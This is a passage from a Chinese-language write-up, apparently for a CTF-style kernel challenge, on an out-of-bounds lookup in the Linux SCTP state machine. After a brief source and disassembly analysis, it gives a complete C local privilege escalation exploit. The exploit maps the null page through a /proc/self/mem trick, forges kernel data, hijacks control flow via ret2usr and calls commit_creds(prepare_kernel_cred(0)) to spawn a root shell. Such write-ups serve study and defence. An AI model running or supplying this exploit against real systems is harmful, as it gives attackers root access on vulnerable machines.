        const struct sctp_sm_table_entry *rtn;              \
                                        \
        if ((event_subtype._type > (_max))) {               \
            pr_warn("table %p possible attack: event %d exceeds max %d\n", \
                _table, event_subtype._type, _max);     \
            rtn = &bug;                     \
        } else                              \
            rtn = &_table[event_subtype._type][(int)state];     \
                                        \
        rtn;                                \
    })
    const struct sctp_sm_table_entry *sctp_sm_lookup_event(
                        struct net *net,
                        enum sctp_event event_type,
                        enum sctp_state state,
                        union sctp_subtype event_subtype)
    {
        switch (event_type) {
    ...
        case SCTP_EVENT_T_PRIMITIVE:
            return DO_LOOKUP(SCTP_EVENT_PRIMITIVE_MAX, primitive,
                     primitive_event_table);
    ...
        }
    }
`rtn = &_table[event_subtype._type][(int)state];`对应的汇编代码如下：
    (gdb) x/10i $eip
    => 0xc180c3dc:  lea    eax,[ecx+ebx*8]
       0xc180c3df:  lea    edx,[eax*8-0x3e646160]
此时的`ebx`即为`state`，可由我们指定，所以`state_fn`可控，伪造好`fn`即可控制PC。由于题目中几乎没有任何内核保护，这里直接ret2usr。
完整利用代码如下：
    #define _GNU_SOURE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include  
    #include 
    #define SERVER_PORT 6666
    #define SCTP_GET_ASSOC_ID_LIST  29
    #define SCTP_RESET_ASSOC    120
    #define SCTP_ENABLE_RESET_ASSOC_REQ 0x02
    #define SCTP_ENABLE_STREAM_RESET    118
    void map_null() {
        void *map =
            mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
        if (map == MAP_FAILED)
            err(1, "mmap");
        int fd = open("/proc/self/mem", O_RDWR);
        if (fd == -1)
            err(1, "open");
        unsigned long addr = (unsigned long)map;
        while (addr != 0) {
            addr -= 0x1000;
            if (lseek(fd, addr, SEEK_SET) == -1)
                err(1, "lseek");
            char cmd[1000];
            sprintf(cmd, "LD_DEBUG=help /bin/su 1>&%d", fd);
            system(cmd);
        }
    }
    void* client_func(void* arg)
    {
        int socket_fd;
        struct sockaddr_in serverAddr;
        struct sctp_event_subscribe event_;
        struct sctp_sndrcvinfo sri;
        int s;
        char sendline[] = "butterfly";
        if ((socket_fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP))==-1){
            perror("client socket");
            pthread_exit(0);
        }
        bzero(&serverAddr, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
        bzero(&event_, sizeof(event_));
        event_.sctp_data_io_event = 1;
        if(setsockopt(socket_fd,IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_))==-1){
            perror("client setsockopt");
            goto client_out_;
        }
        sri.sinfo_ppid = 0;
        sri.sinfo_flags = 0;
        printf("sctp_sendmsg\n");
        if(sctp_sendmsg(socket_fd,sendline,sizeof(sendline),
            (struct sockaddr*)&serverAddr,sizeof(serverAddr),
            sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream,0,0)==-1){
            perror("client sctp_sendmsg");
            goto client_out_;
        }
    client_out_:
        //close(socket_fd);
        pthread_exit(0);
    }
    void* send_recv(void* arg)
    {
        int server_sockfd, msg_flags;
        server_sockfd = *(int*)arg;
        socklen_t len = sizeof(struct sockaddr_in);
        size_t rd_sz;
        char readbuf[20]="0";
        struct sctp_sndrcvinfo sri;
        struct sockaddr_in clientAddr;
        rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),
        (struct sockaddr*)&clientAddr, &len, &sri, &msg_flags);
        sri.sinfo_flags = (1 << 6) | (1 << 2);
        printf("SENDALL.\n");
        len = 0;
        if(sctp_sendmsg(server_sockfd,readbuf,0,(struct sockaddr*)&clientAddr,
            len,sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream, 0,0)<0){
            perror("SENDALL sendmsg");
        }
        pthread_exit(0);
    }
    void* abort_func(void* arg)
    {
        int server_sockfd, msg_flags;
        server_sockfd = *(int*)arg;
        socklen_t len = sizeof(struct sockaddr_in);
        size_t rd_sz;
        char readbuf[20]="0";
        struct sctp_sndrcvinfo sri;
        struct sockaddr_in clientAddr;
        rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),
        (struct sockaddr*)&clientAddr, &len, &sri, &msg_flags);
        sri.sinfo_flags = (1 << 2);
        printf("ABORT.\n");
        if(sctp_sendmsg(server_sockfd,readbuf,rd_sz,(struct sockaddr*)&clientAddr,
            len,sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream, 0,0)<0){
            perror("ABORT sendmsg");
        }
        pthread_exit(0);
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc106a2b1;
    void (*commit_creds)(void*) KERNCALL = (void*) 0xc1069ffd;
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void launch_shell() {
        execl("/bin/sh", "sh", NULL);
    }
    void prepare_tf(void) 
    { 
        asm("pushl %cs; popl tf+4;"
                "pushfl; popl tf+8;"
                "pushl %esp; popl tf+12;"
                "pushl %ss; popl tf+16;");
        tf.eip = &launch_shell;
        tf.esp -= 1024;
    }
    void get_root_shell() {
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
                "iret;");
    }
    int main(int argc, char** argv)
    {
        map_null();
        prepare_tf();
        memset(0, 0, 0x1000);
        *(uint32_t*)0xd4 = 0;
        *(uint32_t*)0x24 = 0;
        *(uint32_t*)0x268 = 0x7cc8e1c;
        *(uint32_t*)0x2a0 = 4;
        *(uint32_t*)0x1000 = &get_root_shell;
        int server_sockfd;
        //int messageFlags_;
        pthread_t thread_array[2];
        pthread_t close_thread;
        pthread_t send_recv_thread;
        int i;
        struct sockaddr_in serverAddr;
        struct sctp_event_subscribe event_;
        //创建服务端SCTP套接字
        if ((server_sockfd = socket(AF_INET,SOCK_SEQPACKET,IPPROTO_SCTP))==-1){
            perror("socket");
            return 0;
        }
        bzero(&serverAddr, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
        //地址绑定
        if(bind(server_sockfd, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) == -1){
            perror("bind");
            goto out_;
        }
        //设置SCTP通知事件
        bzero(&event_, sizeof(event_));
        event_.sctp_data_io_event = 1;
        if(setsockopt(server_sockfd, IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_)) == -1){
            perror("setsockopt");
            goto out_;
        }
        //开始监听
        listen(server_sockfd,100);
        //创建线程，用于客户端链接
        for(i=0; i<1;i++) {
            printf("create no.%d\n",i+1);
            if(pthread_create(&thread_array[i],NULL,client_func,NULL)){
                perror("pthread_create");
                goto out_;
            }
        }
        //创建abort线程
        /*if(pthread_create(&send_recv_thread,NULL,abort_func,(void*)&server_sockfd)){
                perror("pthread_create");
                goto out_;
        }*/
        //创建接收线程
        if(pthread_create(&send_recv_thread,NULL,send_recv,(void*)&server_sockfd)){
                perror("pthread_create");
                goto out_;
        }
        while(1);
    out_:
        close(server_sockfd);
        return 0;
    }
运行结果如图。